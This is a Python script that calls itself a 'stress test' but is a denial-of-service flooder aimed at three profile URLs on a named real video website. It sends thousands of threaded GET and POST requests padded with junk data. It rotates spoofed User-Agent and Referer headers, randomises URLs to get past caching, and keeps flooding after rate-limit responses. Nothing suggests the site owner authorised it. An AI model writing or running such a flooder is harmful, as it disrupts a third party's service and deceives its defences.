import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import threading

# --- Configuration ---
BASE_URLS = [
    "https://www.xvideos.com/profileslist/954352176",
    "https://www.xvideos.com/profileslist/164356176",
    "https://www.xvideos.com/profileslist/304356176"
]
TOTAL_REQUESTS_PER_URL = 2000
CONCURRENT_THREADS = 50
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
]
REFERERS = [
    "https://www.google.com",
    "https://www.bing.com",
    "https://www.reddit.com",
    "https://www.twitter.com"
]
LOG_FILE = "stress_test.log"

# --- Utility Functions ---
def generate_random_url(base_url):
    """Generates a random URL by appending a 9-digit number."""
    random_digits = ''.join([str(random.randint(0, 9)) for _ in range(9)])
    return base_url[:-9] + random_digits

def log_message(message):
    """Logs a message with a timestamp to the console and a file."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    print(log_entry)
    with open(LOG_FILE, "a") as f:
        f.write(log_entry + "\n")

# --- Request Functions ---
def send_heavy_request(base_url):
    """Sends either a GET or POST request with a large payload."""
    random_url = generate_random_url(base_url)
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS),
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "x=" + "A" * random.randint(1000, 5000)
    try:
        if random.choice([True, False]):
            response = requests.get(random_url, headers=headers, timeout=10)
        else:
            response = requests.post(random_url, headers=headers, data=data, timeout=10)

        if response.status_code == 429:
            retry_after = response.headers.get("Retry-After")
            wait_time = int(retry_after) if retry_after and retry_after.isdigit() else random.uniform(1, 3)
            log_message(f"[429] Rate limited from {base_url}. Waiting {wait_time:.2f}s...")
            time.sleep(wait_time)
        else:
            log_message(f"[{response.request.method}] {random_url} => {response.status_code}")

    except requests.exceptions.RequestException as e:
        log_message(f"[ERR] {e} on {base_url}")

def send_regular_request(url):
    """Sends a simple GET request with a random User-Agent."""
    random_url = generate_random_url(url)
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        response = requests.get(random_url, headers=headers, timeout=5)
        log_message(f"[GET] {random_url} => {response.status_code}")
    except requests.exceptions.RequestException as e:
        log_message(f"[ERR] Regular request failed on {url}: {e}")

# --- Flooding Functions ---
def flood(base_url, threads, total_requests, request_function):
    """Floods a URL with a specified number of requests using a thread pool."""
    log_message(f"Starting flood on {base_url} with {threads} threads and {total_requests} requests.")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(total_requests):
            executor.submit(request_function, base_url)
            time.sleep(random.uniform(0.01, 0.05)) # Staggered requests

def backend_stressor(url, num_threads, num_requests):
    """Stresses the backend with regular GET requests using threads."""
    log_message(f"Starting backend stressor on {url} with {num_threads} threads and {num_requests} requests.")
    def worker():
        for _ in range(num_requests // num_threads): # Distribute requests among threads
            send_regular_request(url)
            time.sleep(random.uniform(0.1, 0.5)) # Introduce some delay

    threads = [threading.Thread(target=worker) for _ in range(num_threads)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    log_message(f"Backend stressor on {url} finished.")

# --- Main Execution ---
if __name__ == "__main__":
    log_message("--- Starting Combined Stress Test ---")
    for url in BASE_URLS:
        flood(url, CONCURRENT_THREADS, TOTAL_REQUESTS_PER_URL, send_heavy_request)
        backend_stressor(url, CONCURRENT_THREADS // 2, TOTAL_REQUESTS_PER_URL // 2) # Run a lighter backend stressor concurrently
    log_message("--- Combined Stress Test Finished ---")
